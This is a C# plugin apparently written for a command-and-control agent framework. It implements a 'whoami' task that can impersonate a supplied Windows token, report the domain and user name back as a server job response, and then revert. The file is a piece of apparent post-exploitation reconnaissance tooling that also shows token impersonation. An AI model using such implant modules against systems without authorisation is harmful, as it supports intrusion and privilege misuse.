using Agent.Interfaces;
using Agent.Models;

namespace whoami
{
    public class WhoAmI : IPlugin
    {
        public string Name => "whoami";
        private IAgentConfig config { get; set; }
        private IMessageManager messageManager { get; set; }
        private ILogger logger { get; set; }
        private ITokenManager tokenManager { get; set; }
        public WhoAmI(IMessageManager messageManager, IAgentConfig config, ILogger logger, ITokenManager tokenManager)
        {
            this.messageManager = messageManager;
            this.config = config;
            this.logger = logger;
            this.tokenManager = tokenManager;
        }

        public async Task Execute(ServerJob job)
        {
            if (job.task.token != 0)
            {
                tokenManager.Impersonate(job.task.token);
            }
            logger.Log("Whoami Called.");
            await messageManager.AddResponse(new ResponseResult()
            {
                task_id = job.task.id,
                user_output = $"{Environment.UserDomainName}\\{Environment.UserName}",
                completed = true
            });
            if (job.task.token != 0)
            {
                tokenManager.Revert();
            }
        }
    }
}
